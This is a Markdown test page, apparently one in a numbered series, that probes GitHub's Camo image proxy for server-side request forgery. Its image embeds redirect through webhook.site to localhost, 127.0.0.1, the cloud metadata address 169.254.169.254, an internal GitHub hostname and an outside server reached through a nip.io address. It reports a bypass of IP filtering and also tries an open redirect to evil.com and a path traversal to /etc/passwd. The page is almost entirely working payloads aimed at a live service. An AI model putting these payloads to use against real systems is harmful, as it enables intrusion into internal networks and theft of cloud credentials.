# v48: Response Header & Redirect Chain Analysis

> **KEY FINDING from v47**: nip.io bypass works! Camo fetches from domain-based IPs.
> Now testing: Do response headers or redirects get passed through?

---

## 1. Redirect Chain Tests

### 301 Redirect (webhook.site supports this)
![301](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-301.gif?redirect=true&status=301&to=https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/final-destination.gif)

### 302 Redirect
![302](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-302.gif?redirect=true&status=302&to=https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/final-302.gif)

### External redirect to our server
![ext-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-external.gif?redirect=true&to=http://164.90.187.218.nip.io:8888/from-redirect.gif)

### Redirect to internal
![int-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-internal.gif?redirect=true&to=http://127.0.0.1:8080/)

### Redirect to localhost
![local-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-localhost.gif?redirect=true&to=http://localhost/)

### Redirect to 169.254.169.254
![aws-redir](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-aws.gif?redirect=true&to=http://169.254.169.254/latest/meta-data/)

### Redirect to internal hostname
![internal-host](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/redirect-internal-host.gif?redirect=true&to=http://internal.github.com/)

---

## 2. Content-Type Confusion

### HTML as image (will Camo serve it?)
![html](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/html-test.html)

### SVG via Camo
![svg](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/test.svg)

### JavaScript file (extension)
![js](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/test.js)

---

## 3. Control Tests

### Basic control (v48)
![v48-control](https://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/v48-control.gif)

### HTTP control
![v48-http](http://webhook.site/d73a7f48-bf58-4511-8754-e896f180cba7/v48-http.gif)

---

## 4. Open Redirect via Camo URL?

Camo URLs use format: `https://camo.githubusercontent.com/{hash}/{encoded_url}`

Can we craft a Camo URL that redirects?

### Direct Camo URL with redirect parameter
![camo-redir](https://camo.githubusercontent.com/redirect?url=http://evil.com)

### Camo URL path traversal attempt
![camo-traversal](https://camo.githubusercontent.com/../../../etc/passwd)

---

**v48** - Testing redirect behavior and content-type handling
